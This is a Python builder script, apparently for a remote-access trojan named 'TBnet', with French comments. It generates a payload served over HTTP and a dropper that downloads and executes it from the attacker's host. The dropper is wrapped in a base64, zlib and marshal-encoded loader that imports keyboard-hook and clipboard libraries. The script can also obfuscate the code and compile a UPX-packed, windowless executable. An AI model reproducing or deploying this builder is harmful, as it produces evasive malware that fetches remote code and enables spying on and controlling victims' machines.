import argparse
import subprocess
import os
import shutil
import base64
import zlib
import marshal

image = """ _______  ______                __
|_     _||   __ \.-----..-----.|  |_
  |   |  |   __ <|     ||  -__||   _|
  |___|  |______/|__|__||_____||____|
"""
print(image)
parser = argparse.ArgumentParser(description='TBnet Help Menu')
parser.add_argument('--host', 
                    type=str, 
                    required=True, 
                    dest='host',
                    help='Ip du Server')
parser.add_argument('--port', 
                    type=int, 
                    required=False, 
                    dest='port',
                    default=4444,
                    help='Port du Server')
parser.add_argument('--name',
                    type=str, 
                    required=False, 
                    dest='name', 
                    default="tbnet",
                    help='Définir nom du fichier')
parser.add_argument('--persistance',
                    type=bool,
                    required=False,
                    dest='persistance',
                    default=False,
                    help='Active la persistance automatique')
parser.add_argument('--freeze',
                    action='store_const',
                    const=True,
                    required=False,
                    dest='freeze',
                    default=False,
                    help='compile le client dans un executable')
parser.add_argument('--obf',
                    action='store_const',
                    const=True,
                    required=False,
                    dest='obf',
                    default=False,
                    help='obfusque le code python')
parser.add_argument('--icon',
                    action='store_const',
                    const=True,
                    required=False,
                    dest='icon',
                    default=False,
                    help='obfusque le code python')

args = parser.parse_args()

class GenClient:

    pathDirFichier = "./code/"
    pathDirOutput = "./output/"
    pathDirHttp = "./http/"

    def GenererClient(self, ip, port, persistance, name, freeze, obf, icon):
        fin_dropeur = """)))))
    except Exception as e:
        print(str(e))
        time.sleep(5*60)"""
        debut_loader = "import base64,sys,zlib,marshal,json,urllib,pythoncom,pyHook,win32clipboard,win32com,uuid,time,os;from win32com.makegw.makegwparse import*;from ctypes import*;from urllib import request;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]("
        fin_loader = ")))"
        # definir url du payload
        url = "\"http://" + ip + ":" + str(port + 1) + "/" + name + ".pyw\""
        # creer les dossier outpu et http si il n'éxiste pas
        if not os.path.exists(self.pathDirOutput):
            os.makedirs(self.pathDirOutput)
        if not os.path.exists(self.pathDirHttp):
            os.makedirs(self.pathDirHttp)
        # ecrire le payload dans http
        fichier = open(self.pathDirHttp + name + ".pyw", "w")
        fichier.write(self.ReturnFichier("payload1.txt"))
        fichier.write("\n    host = \"" + ip + "\"\n    port = " + str(port) + "\n")
        fichier.write(self.ReturnFichier("payload2.txt"))
        fichier.close()
        # obfusqué le payload
        if obf:
            os.system("pyminifier --obfuscate-classes -o " + self.pathDirHttp + name + ".pyw" + " " + self.pathDirHttp + name + ".pyw")
        # ecrire le dropeur dans output
        fichier = open(self.pathDirOutput + "drop_" + name + ".pyw", "w")
        ## import sys,zlib,base64,marshal,json,urllib
        dropper = self.ReturnFichier("dropeur.txt") + "{}".format(repr(base64.b64encode(zlib.compress(marshal.dumps("urlopen({}).read()".format(url),2))))) + fin_dropeur
        fichier.write(dropper)
        fichier.close()
        # obfusqué le droppeur
        if obf:
            os.system("pyminifier --obfuscate-classes -o " + self.pathDirOutput + "drop_" + name + ".pyw" + " " + self.pathDirOutput + "drop_" + name + ".pyw")
        # ecrire le loader dans output
        fichier = open(self.pathDirOutput + "load_" + name + ".pyw", "w")
        drop_txt = str(base64.b64encode(open(self.pathDirOutput + "drop_" + name + ".pyw", "r").read().encode('utf-8')))[1:]
        fichier.write(debut_loader + drop_txt + fin_loader)
        fichier.close()
        # si l'options freeze est choisi
        if freeze:
            ## Complier le loader
            if icon:
                os.system("C:/Users/theoc/AppData/Local/Programs/Python/Python37/Scripts/pyinstaller.exe " + self.pathDirOutput + "load_" + name + ".pyw" + " --upx-dir C:\\Users\\theoc\\Downloads\\upx-3.96-win64\\upx-3.96-win64 --clean -y --onefile --noconsole")
            else:
                os.system("C:/Users/theoc/AppData/Local/Programs/Python/Python37/Scripts/pyinstaller.exe " + self.pathDirOutput + "load_" + name + ".pyw" + " --upx-dir C:\\Users\\theoc\\Downloads\\upx-3.96-win64\\upx-3.96-win64 --clean -y --onefile --noconsole --icon C:\\Users\\theoc\\Downloads\\icon.ico")
            print("Compilation terminer")
            print("Nettoyage des fichier temporaire")
            # netoyyer fichier temporaire
            if os.path.exists(self.pathDirOutput + "drop_" + name + ".pyw"):
                os.remove(self.pathDirOutput + "drop_" + name + ".pyw")
            if os.path.exists(self.pathDirOutput + "load_" + name + ".pyw"):
                os.remove(self.pathDirOutput + "load_" + name + ".pyw")
            if os.path.exists("load_" + name + ".spec"):
                os.remove("load_" + name + ".spec")
            shutil.copyfile("dist/" + "load_" + name + ".exe", self.pathDirOutput + name + ".exe")
            shutil.rmtree("dist/")
            shutil.rmtree("build/")
            shutil.rmtree("output/__pycache__")
            print("Client executable prêt : output/" + name + ".exe")
        else:
            print("Client prêt : output/" + "load_" + name + ".pyw")

        

    def ReturnFichier(self, nom_fichier):
        fichier = open(self.pathDirFichier + nom_fichier, "r")
        text = fichier.read()
        fichier.close()
        return text
        

GenClient().GenererClient(args.host, args.port, args.persistance, args.name, args.freeze, args.obf, args.icon)

